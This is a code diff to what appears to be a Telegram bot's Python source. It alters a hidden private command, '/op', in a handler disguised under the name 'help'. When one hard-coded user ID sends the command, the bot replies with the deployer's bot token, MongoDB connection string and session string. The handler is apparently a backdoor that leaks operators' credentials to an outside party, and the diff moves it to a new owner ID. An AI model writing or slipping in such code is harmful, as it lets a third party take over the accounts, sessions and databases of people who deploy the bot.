@@ -106,19 +106,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("alpha")
+    filters.command("op")
     & filters.private
-    & filters.user(8143754205)
+    & filters.user(8056154987)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+          photo=f"https://graph.org/file/bb04aefaa93c936da42d4-64d335f2a4eaeed0f0.jpg",
        caption=f"""ʙσᴛ ᴛσᴋєη :-   `{BOT_TOKEN}` \n\nϻσηɢᴏ :-   `{MONGO_DB_URI}`\n\nѕтʀɪηɢ sєssɪση :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/LEGEND_MICKEY)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ᴀʟᴘʜᴀ ʙᴀʙʏ  •", url=f"https://t.me/ll_ALPHA_BABY_lll")
+                         "•  •", url=f"https://t.me/X_NETWORK_BOTS_I")
                  ]
             ]
          ),
